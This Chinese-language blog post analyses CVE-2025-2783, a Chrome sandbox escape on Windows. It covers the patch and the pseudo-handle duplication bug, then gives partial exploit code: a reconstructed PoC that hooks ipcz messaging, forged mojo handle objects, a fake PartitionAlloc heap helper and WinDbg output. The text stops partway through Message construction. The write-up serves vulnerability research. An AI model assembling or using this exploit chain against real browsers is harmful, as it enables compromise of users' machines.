<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>CVE-2025-2783沙箱逃逸</title>
  <link rel="stylesheet" href="https://stackedit.cn/style.css" />
</head>

<body class="stackedit">
    <a href="../index.html" style="position: fixed; top: 0; left: 2pt; text-align: center;text-decoration-line: none;color: black;font-size: 15px;">
        <img src="../img/home.png" width="15" height="15" alt="home">
        <span>HOME PAGE</span>
      </a>
  <div class="stackedit__html"><h1 id="chrome-fullchain-exploit——sandbox-escape"><span class="prefix"></span><span class="content">Chrome fullchain exploit——Sandbox Escape</span><span class="suffix"></span></h1>
<h2 id="patch分析"><span class="prefix"></span><span class="content">Patch分析</span><span class="suffix"></span></h2>
<p>此漏洞成因分析不多，我们需要借助patch来进行分析，先来看他对此次修复的说明：<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2025-12-31/ukhrQ1UOLak5V3tO.png" alt="输入图片说明"><br>
此次修复主要涉及到一个“sentinel handle“的概念，此句柄会被系统函数误解，这个“sentinel handle“其实就是INVALID_HANDLE_VALUE这些无效句柄<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2025-12-31/X7Rngy5Efj3ovzLD.png" alt="输入图片说明"><br>
<a href="https://chromium-review.googlesource.com/c/chromium/src/+/6380193">chromium-review</a><br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2025-12-31/lqveHzhi3oPWe7RZ.png" alt="输入图片说明">具体去查看修补内容会发现，关键的修复点在DecodeHandle和EncodeHandle两个函数中，当在解码handle时，会检查传入的handle是否是伪句柄，如果是就crash，这里的<code>base::win::IsPseudoHandle</code>函数逻辑比较简单主要就是检查传入的handle是否在-1～-12这个范围内<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2026-01-04/ualD61HiasMHbdha.png" alt="输入图片说明"><br>
EncodeHandle函数修复逻辑与DecodeHandle差不多，也是检查handle是否是伪句柄，<code>is_pseudo_handle</code>函数内部还是去调用<code>base::win::IsPseudoHandle</code>函数，至于<code>is_valid</code>则是检查传入的句柄是否是一个合法句柄：<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2026-01-04/HaEcwjrZOw45Sw4U.png" alt="输入图片说明"></p>
<h2 id="漏洞分析"><span class="prefix"></span><span class="content">漏洞分析</span><span class="suffix"></span></h2>
<p>其实分析完上面的patch，这个漏洞的成因以及触发流程就已经很明朗了，首先作为一个沙箱逃逸漏洞我们可控的只有render进程，所以需要render进程主动向browser进程发起请求，在这里可以让render去调用<code>EncodeHandle</code>向browser发送一个handle为-2的请求，然后browser<code>DecodeHandle</code>处理此handle，因为-2代表当前线程句柄，所以会获取browser端的线程句柄权限并创建新的句柄，最后browser进程再将新的句柄传递给render进程。<br>
这里可能会有两个疑问，先来看<code>DuplicateHandle</code>函数的原型：<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2026-01-04/x5qn95FZTJIK8mGM.png" alt="输入图片说明"><br>
首先<code>DecodeHandle</code>在调用<code>DuplicateHandle</code>函数时，虽然hSourceHandle参数传入了-2，但是hSourceProcessHandle却指向render进程，所以这里拷贝的不是render进程的当前线程句柄吗？</p>
<p><img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2026-01-04/6Dj6Y5TaWjcQOjAk.png" alt="输入图片说明"><br>
从字面意思来看确实如此，但是微软官方文档有明确说明：<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2026-01-04/l1rMPCkvnB1j5ScW.png" alt="输入图片说明"><br>
如果 <em>hSourceHandle</em> 是由 <a href="https://learn.microsoft.com/zh-cn/windows/desktop/api/processthreadsapi/nf-processthreadsapi-getcurrentthread">GetCurrentProcess 或 GetCurrentThread</a> 返回的伪句柄，则 <em>hSourceProcessHandle</em> 应该是调用 <code>DuplicateHandle</code> 的进程句柄。也就是说当_hSourceHandle_为-1或-2时，<em>hSourceProcessHandle</em> 是browser进程的句柄，所以这里获取的其实还是browser进程线程句柄。</p>
<p>其次，就算这里获得了browser线程的复制句柄，但是 <em>hTargetProcessHandle</em> 是browser，也就是说最终创建的handle也只在browser进程中有效，render进程又是如何得到的呢？这里就要提到<code>EncodeHandle</code>函数了：<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2026-01-04/VWCUgUXG998hrB3d.png" alt="输入图片说明"><br>
从render向browser传递数据需要调用<code>EncodeHandle</code>编码，那从browser向render进程返回数据同样需要调用<code>EncodeHandle</code>编码，而在调用<code>EncodeHandle</code>函数时，如果传入handle的所有者不是发送方则会再次调用<code>DuplicateHandle</code>函数将传入的handle再拷贝一份给发送方进程，而通过上面的分析可知，传入的handle是新创建的browser线程句柄副本，它的所有者肯定不是render进程，所以第二次<code>DuplicateHandle</code>操作会将browser线程句柄再拷贝一份给render进程，这样一来render进程就可以访问browser线程的复制句柄了。<br>
所以此漏洞的触发流程应该如下:</p>
<pre><code>render ========EncodeHandle(-2)=========&gt; browser

browser[ DecodeHandle(-2) -&gt; DuplicateHandle(-2) -&gt; local_dupe ]

render &lt;====EncodeHandle(local_dupe)==== browser	
		
render [ DecodeHandle(local_dupe) ]										
</code></pre>
<p>其实关于触发流程这部分也可以通过issue tracker后面的几条comment来验证，主要靠comment 9和comment 15：<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2026-01-07/mm0rSIUhkDJ5cPaA.png" alt="输入图片说明"><br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2026-01-07/yfQqHq7RFx84LeWr.png" alt="输入图片说明"><br>
这里大概是说在漏洞被修补后，google官方又跑了一遍exp，确认patch点可以触发崩溃，在这里可以看出DecodeHandle中的crash在browser中，EncodeHandle中的crash则是在renderer中。</p>
<h2 id="poc--exp"><span class="prefix"></span><span class="content">POC &amp; EXP</span><span class="suffix"></span></h2>
<p>因为在官方issue tracker页面中并未将POC与EXP公开，所以我们需要基于上面的分析以及issue tracker页面中给出的伪代码来还原POC及EXP。<br>
关于漏洞poc部分其实仅靠issue tracker页面给出的伪代码已经基本可以还原了：</p>
<pre class=" language-c"><code class="prism ++ language-c"><span class="token comment">// Get node</span>
  <span class="token function">sub_18002C0C0</span><span class="token punctuation">(</span>node_object<span class="token punctuation">,</span> <span class="token operator">&amp;</span>node_link_object<span class="token punctuation">)</span><span class="token punctuation">;</span>
  ipcz<span class="token punctuation">:</span><span class="token punctuation">:</span>Node<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">GetAssignedName__</span><span class="token punctuation">(</span>node_object<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v20<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment">// Hook "ipcz::NodeLink::OnAcceptRelayedMessage(ipcz::msg::AcceptRelayedMessage&amp;)" function</span>
  v7 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>node_link_object <span class="token operator">+</span> 264i64<span class="token punctuation">;</span>
  OnAcceptRelayedMessage_func_ptr <span class="token operator">=</span> v7<span class="token punctuation">;</span>
  v7 <span class="token operator">&amp;</span><span class="token operator">=</span> 0xFFFFFFFFFFFFF000ui64<span class="token punctuation">;</span>
  <span class="token function">VirtualProtect</span><span class="token punctuation">(</span><span class="token punctuation">(</span>LPVOID<span class="token punctuation">)</span>v7<span class="token punctuation">,</span> 0x1000ui64<span class="token punctuation">,</span> <span class="token number">4u</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>flOldProtect<span class="token punctuation">)</span><span class="token punctuation">;</span>
  OnAcceptRelayedMessage_original <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token function">__int64</span> <span class="token punctuation">(</span>__fastcall <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>_QWORD<span class="token punctuation">,</span> _QWORD<span class="token punctuation">)</span><span class="token punctuation">)</span>OnAcceptRelayedMessage_func_ptr<span class="token punctuation">;</span>
  <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>OnAcceptRelayedMessage_func_ptr <span class="token operator">=</span> OnAcceptRelayedMessage_hook<span class="token punctuation">;</span>
  <span class="token function">VirtualProtect</span><span class="token punctuation">(</span><span class="token punctuation">(</span>LPVOID<span class="token punctuation">)</span>v7<span class="token punctuation">,</span> 0x1000ui64<span class="token punctuation">,</span> flOldProtect<span class="token punctuation">,</span> <span class="token operator">&amp;</span>flOldProtect<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment">// Send RelayMessage with unknown message_id (0x69)</span>
  <span class="token function">LODWORD</span><span class="token punctuation">(</span>v7<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v17 <span class="token operator">=</span> <span class="token operator">-</span>2i64<span class="token punctuation">;</span>
  <span class="token function">base__GetProgramCounter__</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">SetLastError</span><span class="token punctuation">(</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>
  mojo<span class="token punctuation">:</span><span class="token punctuation">:</span>PlatformHandle<span class="token punctuation">:</span><span class="token punctuation">:</span>PlatformHandle_base<span class="token punctuation">:</span><span class="token punctuation">:</span>win<span class="token punctuation">:</span><span class="token punctuation">:</span>GenericScopedHandle_base<span class="token punctuation">:</span><span class="token punctuation">:</span>win<span class="token punctuation">:</span><span class="token punctuation">:</span>HandleTraits_base<span class="token punctuation">:</span><span class="token punctuation">:</span>win<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">DummyVerifierTraits__</span><span class="token punctuation">(</span>
    <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>v18<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v17<span class="token punctuation">)</span><span class="token punctuation">;</span>
  v8 <span class="token operator">=</span> <span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">operator_new_unsigned_long_long_</span><span class="token punctuation">(</span>32i64<span class="token punctuation">)</span><span class="token punctuation">;</span>
  mojo<span class="token punctuation">:</span><span class="token punctuation">:</span>PlatformHandle<span class="token punctuation">:</span><span class="token punctuation">:</span>operator__mojo<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">PlatformHandle___</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>v23<span class="token punctuation">,</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token operator">&amp;</span>v18<span class="token punctuation">)</span><span class="token punctuation">;</span>
  mojo<span class="token punctuation">:</span><span class="token punctuation">:</span>core<span class="token punctuation">:</span><span class="token punctuation">:</span>ipcz_driver<span class="token punctuation">:</span><span class="token punctuation">:</span>WrappedPlatformHandle<span class="token punctuation">:</span><span class="token punctuation">:</span>WrappedPlatformHandle_mojo<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">PlatformHandle_</span><span class="token punctuation">(</span>v8<span class="token punctuation">,</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>v23<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">LOBYTE</span><span class="token punctuation">(</span>v9<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0xAA</span><span class="token punctuation">;</span>
  <span class="token function">memset</span><span class="token punctuation">(</span>v23<span class="token punctuation">,</span> v9<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>v23<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  ipcz<span class="token punctuation">:</span><span class="token punctuation">:</span>Message<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">Message_unsigned_char__unsigned_long_long_</span><span class="token punctuation">(</span>v23<span class="token punctuation">,</span> <span class="token number">0x69</span><span class="token punctuation">,</span> 0x10i64<span class="token punctuation">)</span><span class="token punctuation">;</span>
  v10 <span class="token operator">=</span> v23<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  v11 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8 <span class="token operator">*</span><span class="token punctuation">)</span>v23<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v23<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">+</span> v11<span class="token punctuation">)</span> <span class="token operator">=</span> 0xDEADBEEF12345678ui64<span class="token punctuation">;</span>
  <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v10 <span class="token operator">+</span> v11 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> 0i64<span class="token punctuation">;</span>
  <span class="token function">DriverObject</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v16<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>node_object <span class="token operator">+</span> <span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>v8<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">TakeDriverObject__</span><span class="token punctuation">(</span>driver_object<span class="token punctuation">,</span> <span class="token punctuation">(</span>__int64 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v16<span class="token punctuation">)</span><span class="token punctuation">;</span>
  ipcz<span class="token punctuation">:</span><span class="token punctuation">:</span>Message<span class="token punctuation">:</span><span class="token punctuation">:</span>AppendDriverObject_ipcz<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">DriverObject_</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>v23<span class="token punctuation">,</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>driver_object<span class="token punctuation">)</span><span class="token punctuation">;</span>
  ipcz<span class="token punctuation">:</span><span class="token punctuation">:</span>NodeLink<span class="token punctuation">:</span><span class="token punctuation">:</span>RelayMessage_ipcz<span class="token punctuation">:</span><span class="token punctuation">:</span>NodeName_const___ipcz<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">Message__</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>node_link_object<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v20<span class="token punctuation">,</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>v23<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>这里的代码执行流程如下：</p>
<ol>
<li>通过node_object获取node_link_object</li>
<li>通过node_object来获取起对应的assigned_name</li>
<li>获取node_link_object对象的NodeLink::OnAcceptRelayedMessage函数地址，并Hook它</li>
<li>这一步主要是将错误的伪句柄-2打包并构造要发送的message</li>
<li>调用node_link_object RelayMessage函数触发render进程的序列化EncodeHandle操作，并将错误的句柄发送给browser进程从而触发漏洞。</li>
</ol>
<p>这里的node_object是一个全局变量<a href="https://source.chromium.org/chromium/chromium/src/+/main:mojo/core/ipcz_api.cc?q=symbol%3A%5Cbmojo%3A%3Acore%3A%3Ag_node%5Cb%20case%3Ayes">g_node</a>，通常在chrome中每个进程只有一个node节点对象，但多个node也是被允许的，但似乎主要是在测试场景中，比如在一个进程中模拟逻辑上的多进程间通信，这一点在<a href="https://source.chromium.org/chromium/chromium/src/+/main:third_party/ipcz/include/ipcz/ipcz.h;l=1011">CreateNode</a>函数注释中有提到：<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2026-01-06/iwMHOXci6Lhaspj2.png" alt="输入图片说明"><br>
既然g_node是一个全局变量，那要获取他就简单得多了，我们可以直接使用chrome模块基址+硬编码偏移，也可以通过特征码去chrome模块内存空间中去遍历查找。<br>
而node_link_object则可以从g_node中获取，注意上面g_node本质是一个用来包装真实node的指针对象，所以要得到真实的node地址需要多一次指针解引用：<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2026-01-06/pDIn6nJrVbUdsQEu.png" alt="输入图片说明"><br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2026-01-06/OY3T5XMSOBFE5POM.png" alt="输入图片说明"><br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2026-01-06/6gd7eJFrBPLyCHF7.png" alt="输入图片说明"><br>
真实的ipcz::Node对象结构如下：<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2026-01-06/L0ImcogwW7xwo1Rb.png" alt="输入图片说明"><br>
这里面主要关注broker_link_字段，从这里对broker link的描述来看，他是进程启动后第一个连接的代理节点，并且如果此连接断开的话将会无法维持与其他节点的连接，虽然我没有找到比较权威官方文档的明确说明，但从他的功能描述来看，这个代理进程应该就是浏览器主进程：<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2026-01-06/cCXpZlPgasTb5pQB.png" alt="输入图片说明"><br>
所以得到g_node与broker_link后我们就可以从render进程调用其相关函数向browser进程发送message，也就是说完成这一步相当于我们就基本完成了伪代码中<code>sub_18002C0C0</code>函数及node_object获取的步骤。</p>
<p>后面需要构造四个对象：PlatformHandle、WrappedPlatformHandle、Message、DriverObject，这几个对象将会携带可以触发browser端漏洞的payload。</p>
<pre class=" language-bash"><code class="prism  language-bash">0:023<span class="token operator">&gt;</span> dt chrome<span class="token operator">!</span>mojo::PlatformHandle
   +0x000 type_            <span class="token keyword">:</span> mojo::PlatformHandle::Type
   +0x008 handle_          <span class="token keyword">:</span> base::win::GenericScopedHandle<span class="token operator">&lt;</span>base::win::HandleTraits,base::win::DummyVerifierTraits<span class="token operator">&gt;</span>
</code></pre>
<p>PlatformHandle对象比较简单type_用于标识handle类型，而handle_则可以直接携带前面提到的伪句柄-2，这部分我们完全可以自己定义，但要注意内存对齐，否则的话可能会与chromium中的PlatformHandle对象大小不一致，导致越界，PlatformHandle相关内容可查阅代码：<a href="https://source.chromium.org/chromium/chromium/src/+/main:mojo/public/cpp/platform/platform_handle.h;l=43">PlatformHandle</a>，此处不再赘述：</p>
<pre class=" language-bash"><code class="prism  language-bash">struct ScopedHandle <span class="token punctuation">{</span>
    HANDLE handle_<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

struct alignas<span class="token punctuation">(</span>8<span class="token punctuation">)</span> PlatformHandle <span class="token punctuation">{</span>
    Type type_<span class="token punctuation">;</span>
    ScopedHandle handle_<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre>
<p>WrappedPlatformHandle的构造可能会复杂一些：</p>
<pre class=" language-bash"><code class="prism  language-bash">0:023<span class="token operator">&gt;</span> dt chrome<span class="token operator">!</span>mojo::core::ipcz_driver::WrappedPlatformHandle
   +0x008 ref_count_       <span class="token keyword">:</span> base::AtomicRefCount
   +0x000 __VFN_table <span class="token keyword">:</span> Ptr64 
   +0x00c type_            <span class="token keyword">:</span> mojo::core::ipcz_driver::ObjectBase::Type
   +0x010 handle_          <span class="token keyword">:</span> mojo::PlatformHandle
</code></pre>
<p>type_用于标记对象类型，handle_就是前面构造好的PlatformHandle对象，这两个字段并不复杂，这里ref_count_用于标记对象引用次数，这里我并没有深究，直接写入1就可以正常使用了，虽然可能会触发几个DCHECK，但这在stable版本上完全不是问题，因为他根本不会被触发。__VFN_table则是该对象的虚表直接找到写入即可。<br>
但上面这些都不是这个对象最麻烦的地方，它最麻烦的地方在于，WrappedPlatformHandle对象的内存由PartitionAlloc管理，当该对象使用完成后将会由PartitionAlloc回收，这个过程会对其PartitionRoot元数据区进行一些操作，而我们伪造的WrappedPlatformHandle对象并不是一个真的由PartitionAlloc管理的对象，所以在回收释放时将会出现多个非法内存访问，为应对这个问题，我们需要自己实现一个堆管理函数，可以申请保留一大段内存，然后在保留内存段中计算找到一个与<a href="https://source.chromium.org/chromium/chromium/src/+/main:base/allocator/partition_allocator/src/partition_alloc/partition_alloc_constants.h;bpv=1;bpt=1;l=261?q=kSuperPageBaseMask&amp;ss=chromium%2Fchromium%2Fsrc&amp;gsn=kSuperPageBaseMask&amp;gs=KYTHE%3A%2F%2Fkythe%3A%2F%2Fchromium.googlesource.com%2Fcodesearch%2Fchromium%2Fsrc%2F%2Fmain%3Flang%3Dc%252B%252B%3Fpath%3Dbase%2Fallocator%2Fpartition_allocator%2Fsrc%2Fpartition_alloc%2Fpartition_alloc_constants.h%23qXgM-XzaTYwU6ET6Bk0DoR9sqpC5qfqlHVl3VNmeBkw">kSuperPageBaseMask</a>对齐的地址，然后提交，之后将PartitonAlloc中所需要读写的内容写入到元数据区相关位置即可绕过这些崩溃，同样与上面的ref_count一样，对于这块内容，我的原则是能跑就行，并没有完整的去构造一个伪SuperPage，因为如果要完整构造的话需要花一定的时间去查看相关文档，且最终构造的dll需要通过我们自己实现的shellcode映射进渲染进程执行，如果代码逻辑过于繁杂庞大，那dll的尺寸也将会同样变大，这对js rce的利用来讲是不利的。<br>
部分代码：</p>
<pre class=" language-c"><code class="prism ++ language-c">class HeapHelper <span class="token punctuation">{</span>
public<span class="token punctuation">:</span>
<span class="token comment">// ...省略</span>
    bool <span class="token function">init_heap</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// 先 reserve 更大的范围（HEAP_SECTION_SIZE + 最多 2MiB）</span>
        size_t reserve_size <span class="token operator">=</span> HEAP_SECTION_SIZE <span class="token operator">+</span> kSuperPageSize<span class="token punctuation">;</span>
				<span class="token comment">//保留内存</span>
        uintptr_t reserved <span class="token operator">=</span> <span class="token punctuation">(</span>uintptr_t<span class="token punctuation">)</span><span class="token function">VirtualAlloc</span><span class="token punctuation">(</span>
            <span class="token constant">NULL</span><span class="token punctuation">,</span>
            reserve_size<span class="token punctuation">,</span>
            MEM_RESERVE<span class="token punctuation">,</span>
            PAGE_NOACCESS<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>reserved <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> false<span class="token punctuation">;</span>
        <span class="token comment">// 计算对齐地址</span>
        uintptr_t aligned_base <span class="token operator">=</span> 
            <span class="token punctuation">(</span>reserved <span class="token operator">+</span> kSuperPageOffsetMask<span class="token punctuation">)</span> <span class="token operator">&amp;</span>
            kSuperPageBaseMask<span class="token punctuation">;</span>
		<span class="token comment">// 对齐后的地址+堆段大小后不应该超过前面的保留内存大小，否则会越界</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>aligned_base <span class="token operator">+</span> HEAP_SECTION_SIZE<span class="token punctuation">)</span> <span class="token operator">&gt;</span> 
            <span class="token punctuation">(</span>reserved <span class="token operator">+</span> reserve_size<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">VirtualFree</span><span class="token punctuation">(</span>
                <span class="token punctuation">(</span>LPVOID<span class="token punctuation">)</span>reserved<span class="token punctuation">,</span>
                <span class="token number">0</span><span class="token punctuation">,</span> MEM_RELEASE<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> false<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
		<span class="token comment">// 提交内存</span>
        this<span class="token operator">-&gt;</span>base_ <span class="token operator">=</span> <span class="token punctuation">(</span>uintptr_t<span class="token punctuation">)</span><span class="token function">VirtualAlloc</span><span class="token punctuation">(</span>
            <span class="token punctuation">(</span>LPVOID<span class="token punctuation">)</span>aligned_base<span class="token punctuation">,</span>
            HEAP_SECTION_SIZE<span class="token punctuation">,</span>
            MEM_COMMIT<span class="token punctuation">,</span>
            PAGE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span>this<span class="token operator">-&gt;</span>base_ <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">VirtualFree</span><span class="token punctuation">(</span>
                <span class="token punctuation">(</span>LPVOID<span class="token punctuation">)</span>reserved<span class="token punctuation">,</span> 
                <span class="token number">0</span><span class="token punctuation">,</span> MEM_RELEASE<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> false<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token comment">// 元数据区域全部填充0</span>
        <span class="token function">memset</span><span class="token punctuation">(</span><span class="token punctuation">(</span>LPVOID<span class="token punctuation">)</span>this<span class="token operator">-&gt;</span>base_<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> HEAP_METADATA_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token comment">// 重要！填充相关元数据字段，省略...</span>
	
		<span class="token comment">// 相关对象字段，方便内存的申请与释放</span>
        this<span class="token operator">-&gt;</span>metadata_end_ <span class="token operator">=</span> this<span class="token operator">-&gt;</span>base_ <span class="token operator">+</span> HEAP_METADATA_SIZE<span class="token punctuation">;</span>
        this<span class="token operator">-&gt;</span>current_addr_ <span class="token operator">=</span> this<span class="token operator">-&gt;</span>metadata_end_<span class="token punctuation">;</span>
        this<span class="token operator">-&gt;</span>end_ <span class="token operator">=</span> this<span class="token operator">-&gt;</span>base_ <span class="token operator">+</span> HEAP_SECTION_SIZE<span class="token punctuation">;</span>

        <span class="token keyword">return</span> true<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token comment">// 省略其他相关函数实现...</span>
  <span class="token punctuation">}</span>
</code></pre>
<p>Message对象的构造会更加复杂：</p>
<pre class=" language-bash"><code class="prism  language-bash">0:023<span class="token operator">&gt;</span> dt chrome<span class="token operator">!</span>ipcz::Message
   +0x000 inlined_data_    <span class="token keyword">:</span> std::__Cr::optional<span class="token operator">&lt;</span>absl::InlinedVector<span class="token operator">&lt;</span>unsigned char,128,std::__Cr::allocator<span class="token operator">&lt;</span>unsigned char<span class="token operator">&gt;</span> <span class="token operator">&gt;</span> <span class="token operator">&gt;</span>
   +0x090 received_data_   <span class="token keyword">:</span> std::__Cr::optional<span class="token operator">&lt;</span>ipcz::Message::ReceivedDataBuffer<span class="token operator">&gt;</span>
   +0x0a8 data_            <span class="token keyword">:</span> absl::Span<span class="token operator">&lt;</span>unsigned char<span class="token operator">&gt;</span>
   +0x0b8 driver_objects_  <span class="token keyword">:</span> absl::InlinedVector<span class="token operator">&lt;</span>ipcz::DriverObject,2,std::__Cr::allocator<span class="token operator">&lt;</span>ipcz::DriverObject<span class="token operator">&gt;</span> <span class="token operator">&gt;</span>
   +0x0e0 transmissible_driver_handles_ <span class="token keyword">:</span> absl::InlinedVector<span class="token operator">&lt;</span>unsigned long long,2,std::__Cr::allocator<span class="token operator">&lt;</span>unsigned long long<span class="token operator">&gt;</span> <span class="token operator">&gt;</span>
   +0x0f8 envelope_        <span class="token keyword">:</span> ipcz::DriverObject
</code></pre>
<p>但是我们可以直接用Message对象的构造函数来帮我们构造，直接在text段根据函数特征码匹配搜索其构造函数，也可以直接用硬编码的函数地址偏移+chrome模块基址来获取函数地址，最后通过函数指针引用然后直接将我们伪造Message对象的内存作为this指针及函数的首个参数传入，并传入其他相关参数执行后就可以得到一个完整的Message对象。要额外注意的是message_id参数，我们之后需要通过他来过滤browser返回给我们的message，我用了issue tracker里面用到的0x69来做message_id，那肯定就会有人好奇，为什么前面的几个对象我不用这种办法直接用类原有的构造函数去构造，原因很简单，因为上面几个类的构造函数都被内联了，而直接调用内联函数地址的话，会破坏上下文并且函数传参也会出问题，比如我们的exp去调用Message的构造函数，那这个函数执行完后应该回到我们的exp中，但如果直接调用内联函数的话，这个函数执行完毕后会回到内联他的那个父函数中去，这样就会完全破坏我们的上下文。即使是Message我也只找到了一个符合要求没被内联的重载构造函数：<br>
<img src="https://raw.githubusercontent.com/anansi2safe/image/main/imgs/2026-01-15/pGMrOW0Yj8k5ylEA.png" alt="输入图片说明"></p>
<pre class=" language-bash"><code class="prism  language-bash">0:023<span class="token operator">&gt;</span> x chrome<span class="token operator">!</span>ipcz::Message::Message
00007ff9<span class="token variable"><span class="token variable">`</span>21ae4750 chrome<span class="token operator">!</span>ipcz::Message::Message <span class="token punctuation">(</span>unsigned char, unsigned int64<span class="token punctuation">)</span> // 只有他没被内联
00007ff9<span class="token variable">`</span></span>21affad1 chrome<span class="token operator">!</span>ipcz::Message::Message <span class="token operator">=</span>  <span class="token punctuation">(</span>inline caller<span class="token punctuation">)</span> chrome<span class="token operator">!</span>ipcz::msg::NodeMessageListener::OnTransportMessage+d1
00007ff9<span class="token variable"><span class="token variable">`</span>21affbc4 chrome<span class="token operator">!</span>ipcz::Message::Message <span class="token operator">=</span>  <span class="token punctuation">(</span>inline caller<span class="token punctuation">)</span> chrome<span class="token operator">!</span>ipcz::msg::NodeMessageListener::OnTransportMessage+1c4
00007ff9<span class="token variable">`</span></span>21affcc6 chrome<span class="token operator">!</span>ipcz::Message::Message <span class="token operator">=</span>  <span class="token punctuation">(</span>inline caller<span class="token punctuation">)</span> chrome<span class="token operator">!</span>ipcz::msg::NodeMessageListener::OnTransportMessage+2c6
